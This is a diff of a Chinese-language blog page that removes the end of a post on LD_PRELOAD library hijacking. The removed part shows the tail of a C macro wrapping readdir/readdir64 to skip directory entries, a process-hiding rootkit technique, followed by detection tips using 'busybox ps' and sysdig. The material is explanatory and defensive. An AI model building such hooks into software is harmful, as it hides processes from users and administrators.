&#123;         \</span><br><span class="line">                continue;                                               \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">        break;                                                          \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">    return dir;                                                         \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>
-
-<h2 id="应对方法"><a href="#应对方法" class="headerlink" title="应对方法"></a>应对方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、busybox</span><br><span class="line">busybox ps方式执行ps，可以不预加载库对于劫持lib场景有奇效。</span><br><span class="line">busybox ps</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2、sysdig</span><br><span class="line">还可以通过</span><br><span class="line"></span><br><span class="line">sudo sysdig -c topprocs_cpu     # 查看cpu进程占用情况</span><br><span class="line">sudo sysdig proc.name contains evil_script   # 针对包含evil_script的进程监测</span><br><span class="line"># 监测网络情况</span><br><span class="line">sudo sysdig -c topprocs_net</span><br><span class="line">sudo sysdig -c topconns</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -612,7 +613,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
